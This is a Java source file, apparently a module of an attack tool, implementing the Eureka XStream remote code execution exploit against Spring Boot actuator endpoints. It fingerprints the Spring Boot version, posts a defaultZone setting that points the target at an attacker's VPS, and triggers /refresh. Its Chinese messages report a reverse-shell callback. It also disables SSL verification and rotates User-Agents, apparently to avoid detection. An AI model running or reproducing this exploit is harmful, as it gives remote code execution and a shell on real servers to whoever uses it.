package src.main.module;

import src.main.common.UA_Config;
import src.main.impl.ResultCallback;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class EurekaXsRCE {
    private String address;
    private String vpsIP;
    private String vpsPORT;
    public String text = "";
    public String expData1 = "eureka.client.serviceUrl.defaultZone=http://%s/";
    public String expData2 = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://%s/\"}";

    public EurekaXsRCE(String address,String vpsIP, String vpsPORT){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPORT = vpsPORT;
    }

    public void Result1(ResultCallback callback){
        String api = "/env";
        String refapi = "/refresh";
        String site = address + api;
        String refsite = address + refapi;
        String llib = "spring-boot-starter-actuator";
        String llib1 = "spring-cloud-starter-netflix-eureka-client";
        String data = String.format(expData1,vpsIP + ":" + vpsPORT);
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib) && response.toString().contains(llib1))) {
                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = String.format("spring-cloud-starter 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    text = String.format("spring-cloud-starter-netflix-eureka-client 依赖为：%s",matcher1.group(1));
                    callback.onResult(text);
                    URL obj1 = new URL(site);
                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                    ua = uacf.getRandomUserAgent(ualist);
                    conn1.setRequestProperty("User-Agent",ua);
                    conn1.setRequestMethod("POST");
                    conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                    conn1.setDoOutput(true);
                    try (OutputStream os = conn1.getOutputStream()) {
                        byte[] input = data.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    int responseCode1 = conn1.getResponseCode();
                    if (responseCode1 == HttpURLConnection.HTTP_OK){
                        URL obj2 = new URL(refsite);
                        HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                        ua = uacf.getRandomUserAgent(ualist);
                        conn2.setRequestProperty("User-Agent",ua);
                        conn2.setRequestMethod("POST");
                        conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                        conn2.setDoOutput(true);
                        int responseCode2 = conn2.getResponseCode();
                        if (responseCode2 == HttpURLConnection.HTTP_OK){
                            text = "反弹成功，请到反弹vps上查看";
                            callback.onResult(text);
                        }else{
                            text = "反弹失败，请查看vps状态或网络状态后重试";
                            callback.onResult(text);
                        }
                    }else{
                        text = "发送refresh失败，请重试";
                        callback.onResult(text);
                    }
                }else {
                    text = "未找到spring-cloud-starter 依赖和spring-cloud-starter-netflix-eureka-client 依赖";
                    callback.onResult(text);
                }
            }else{
                text = "发送请求失败，请重试";
                callback.onResult(text);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void Result2(ResultCallback callback){
        String api = "/actuator/env";
        String site = address + api;
        String refapi = "/actuator/refresh";
        String refsite = site + refapi;
        String llib = "spring-boot-starter-actuator";
        String llib1 = "spring-cloud-starter-netflix-eureka-client";
        String data = String.format(expData2,vpsIP + ":" + vpsPORT);
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib) && response.toString().contains(llib1))) {
                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = String.format("spring-cloud-starter 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    text = String.format("spring-cloud-starter-netflix-eureka-client 依赖为：%s",matcher1.group(1));
                    callback.onResult(text);
                    URL obj1 = new URL(site);
                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                    ua = uacf.getRandomUserAgent(ualist);
                    conn1.setRequestProperty("User-Agent",ua);
                    conn1.setRequestMethod("POST");
                    conn1.setRequestProperty("Content-Type","application/json");
                    conn1.setDoOutput(true);
                    try (OutputStream os = conn1.getOutputStream()) {
                        byte[] input = data.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    int responseCode1 = conn1.getResponseCode();
                    if (responseCode1 == HttpURLConnection.HTTP_OK){
                        URL obj2 = new URL(refsite);
                        HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                        ua = uacf.getRandomUserAgent(ualist);
                        conn2.setRequestProperty("User-Agent",ua);
                        conn2.setRequestMethod("POST");
                        conn2.setRequestProperty("Content-Type","application/json");
                        conn2.setDoOutput(true);
                        int responseCode2 = conn2.getResponseCode();
                        if (responseCode2 == HttpURLConnection.HTTP_OK){
                            text = "反弹成功，请到反弹vps上查看";
                            callback.onResult(text);
                        }else{
                            text = "反弹失败，请查看vps状态或网络状态后重试";
                            callback.onResult(text);
                        }
                    }else{
                        text = "发送refresh失败，请重试";
                        callback.onResult(text);
                    }
                }
                else {
                    text = "未找到spring-cloud-starter 依赖和spring-cloud-starter-netflix-eureka-client 依赖";
                    callback.onResult(text);
                }
            }else{
                text = "发送请求失败，请重试";
                callback.onResult(text);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public Stream<String> Exp(ResultCallback callback) throws IOException{
        Stream.Builder<String> builder = Stream.builder();
        String api ="/actuator/env";
        String site = address + api;
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 存在路径是springboot2，否则是springboot1
                text = "当前版本为springboot2";
                callback.onResult(text);
                Result2(callback);
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
                callback.onResult(text);
                Result1(callback);
            }else{
                text = "未识别springboot版本";
                callback.onResult(text);
            }
        }catch (IOException e){
            e.printStackTrace();
        }
        return builder.build();
    }

}
